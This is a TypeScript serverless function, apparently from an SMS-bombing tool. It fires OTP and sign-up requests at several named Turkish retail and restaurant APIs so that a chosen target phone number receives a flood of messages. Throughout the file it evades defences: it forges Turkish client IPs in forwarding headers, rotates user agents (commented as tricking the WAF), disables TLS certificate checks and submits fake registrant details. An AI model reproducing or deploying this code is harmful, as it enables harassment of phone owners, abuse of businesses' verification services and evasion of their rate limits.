// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Sertifika Doğrulamayı Devre Dışı Bırak (Legacy API'lar için şart)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// --- KİMLİK GİZLEME (STEALTH) ARAÇLARI ---

// 1. Rastgele Türk IP Üretici (WAF Kandırmaca)
const getRandomTurkishIP = () => {
  const blocks = [
    [88, 224, 255], // TTNet/Türk Telekom
    [85, 96, 111],  // TTNet
    [176, 216, 223], // Superonline
    [195, 174, 175], // Vodafone
    [94, 54, 55]     // TurkNet
  ];
  const block = blocks[Math.floor(Math.random() * blocks.length)];
  return `${block[0]}.${Math.floor(Math.random() * (block[2] - block[1] + 1)) + block[1]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

// 2. Rastgele User-Agent Üretici (Farklı Cihaz Taklidi)
const getRandomUA = () => {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
};

const formatPhone = (p: string) => {
  const raw = p.replace(/\D/g, '').slice(-10);
  return {
    raw: raw,
    with90: `90${raw}`,
    plus90: `+90${raw}`,
    with0: `0${raw}`,
    spaced0: `0 (${raw.slice(0,3)}) ${raw.slice(3,6)} ${raw.slice(6,8)} ${raw.slice(8,10)}`
  };
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS & OPTIONS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    if (!body.serviceUrl) return res.status(400).json({ error: 'Missing URL' });

    const phones = formatPhone(body.targetPhone || '5555555555');
    const serviceId = (body.serviceId || '').toLowerCase();
    const email = body.email || "memati.bas@gmail.com";
    const targetUrl = body.serviceUrl;

    let payload: any = {};
    let customHeaders: any = {};
    const fakeIP = getRandomTurkishIP();

    // --- SNIPER PAYLOAD & HEADER HARİTASI (Python Script Referanslı) ---
    switch (true) {
      case serviceId.includes('kahve_dunyasi'):
        payload = { countryCode: "90", phoneNumber: phones.raw };
        customHeaders = { "X-Language-Id": "tr-TR", "X-Client-Platform": "web" };
        break;
      case serviceId.includes('english_home') || serviceId.includes('alixavien'):
        payload = { Phone: phones.raw, XID: "" };
        break;
      case serviceId.includes('tikla_gelsin'):
        payload = { operationName: "GENERATE_OTP", variables: { phone: phones.plus90, challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB" }, query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n" };
        customHeaders = { "X-Device-Type": "2", "Appversion": "2.4.1" };
        break;
      case serviceId.includes('suiste'):
        payload = { action: "register", gsm: phones.raw, full_name: "Memati Bas", device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330" };
        customHeaders = { "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-App-Version": "1.7.11" };
        break;
      case serviceId.includes('lc_waikiki'):
        payload = { RegisterFormView: { RegisterPhoneNumber: phones.spaced0.slice(2), RegisterEmail: email, Password: "Password123!", PhoneAreaCode: "0090", IsMemberPrivacyRequired: true, IsSmsChecked: true, ActivationCode: "", CaptchaCode: "", Referer: null } };
        customHeaders = { "adrum": "isAjax:true" };
        break;
      case serviceId.includes('baydoner'):
        payload = { PhoneNumber: phones.raw, AreaCode: 90, Name: "Memati", Surname: "Bas", Email: email, Platform: 1, AppVersion: "1.6.0", DeviceId: "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3" };
        customHeaders = { "Merchantid": "5701", "Xsid": "2HB7FQ6G42QL" };
        break;
      case serviceId.includes('kofteci_yusuf'):
        payload = { FirmaId: 82, Telefon: phones.raw, FireBaseCihazKey: null, GuvenlikKodu: null };
        customHeaders = { "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq" };
        break;
      default:
        payload = { phone: phones.raw, mobile: phones.raw, phoneNumber: phones.raw };
    }

    // --- FETCH İŞLEMİ ---
    const response = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        'User-Agent': getRandomUA(),
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'X-Forwarded-For': fakeIP, // IP Spoofing
        'X-Real-IP': fakeIP,
        'Origin': new URL(targetUrl).origin,
        'Referer': new URL(targetUrl).origin + '/',
        ...customHeaders
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();
    
    return res.status(200).json({
      reachable: true,
      ok: response.ok,
      status: 200,
      upstreamStatus: response.status,
      serviceId: serviceId,
      responsePreview: responseText.substring(0, 200),
      error: response.ok ? null : `Status: ${response.status}`
    });

  } catch (error: any) {
    return res.status(200).json({ ok: false, error: error.message });
  }
}